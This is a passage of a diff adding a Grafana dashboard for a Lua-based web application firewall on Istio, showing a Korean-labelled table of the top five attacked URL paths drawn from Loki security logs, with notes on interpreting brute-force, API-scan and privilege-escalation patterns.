+        { "id": "sortBy", "options": { "fields": {}, "sort": [{ "desc": true, "field": "건수" }] } },
+        { "id": "limit", "options": { "limitField": 5 } }
+      ],
+      "type": "table"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## Top 5 공격 대상 경로\n\n가장 많이 공격받은 URL 경로입니다.\n\n**분석 포인트:**\n- 로그인/인증 경로가 많으면 → 무차별 대입 공격\n- API 경로가 많으면 → API 취약점 스캔\n- 관리자 경로가 많으면 → 권한 상승 시도\n\n**경로별 상세 검색:**\n```\n{namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` | json | path = `/api/login`\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "custom": { "align": "auto", "cellOptions": { "type": "auto" }, "inspect": false },
+          "mappings": [],
+          "thresholds": { "mode": "absolute", "steps": [{ "color": "green", "value": null }, { "color": "yellow", "value": 10 }, { "color": "red", "value": 50 }] }
+        },
+        "overrides": [
+          { "matcher": { "id": "byName", "options": "건수" }, "properties": [{ "id": "custom.cellOptions", "value": { "mode": "basic", "type": "color-background" } }] }
+        ]
+      },
+      "gridPos": { "h": 8, "w": 12, "x": 12, "y": 29 },
+      "id": 17,
+      "options": { "cellHeight": "sm", "footer": { "countRows": false, "fields": "", "reducer": ["sum"], "show": false }, "showHeader": true, "sortBy": [{ "desc": true, "displayName": "건수" }] },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum by (path) (count_over_time({namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` != `/api/datasources/` | regexp `path\\\":\\\"(?P<path>[^\\\"]+)\\\"` [$__range]))",
+          "legendFormat": "",
+          "refId": "A"
+        }
+      ],
+      "title": "🎯 Top 공격 대상 경로",
+      "transformations": [
+        { "id": "reduce", "options": { "reducers": ["lastNotNull"] } },
+        { "id": "organize", "options": { "renameByName": { "Field": "경로", "Total": "건수" } } },
+        { "id": "sortBy", "options": { "fields": {}, "sort": [{ "desc": true, "field": "건수" }] } },
+        { "id": "limit", "options": { "limitField": 5 } }
+      ],
+      "type": "table"
+    }
+  ],
+  "refresh": "30s",
+  "schemaVersion": 39,
+  "tags": ["istio", "waf", "security", "lua"],
+  "templating": {
+    "list": [
+      {
+        "current": { "selected": false, "text": "Loki", "value": "loki" },
+        "hide": 0,
+        "includeAll": false,
+        "label": "Loki Datasource",
+        "multi": false,
+        "name": "lokidatasource",
+        "options": [],
+        "query": "loki",
+        "refresh": 1,
+        "regex": "",
+        "skipUrlSync": false,
+        "type": "datasource"
+      }
+    ]
+  },
+  "time": { "from": "now-1h", "to": "now" },
+  "timepicker": {},
+  "timezone": "browser",
+  "title": "Lua WAF 보안 정책",
+  "uid": "lua-waf-policy",
+  "version": 1
+}
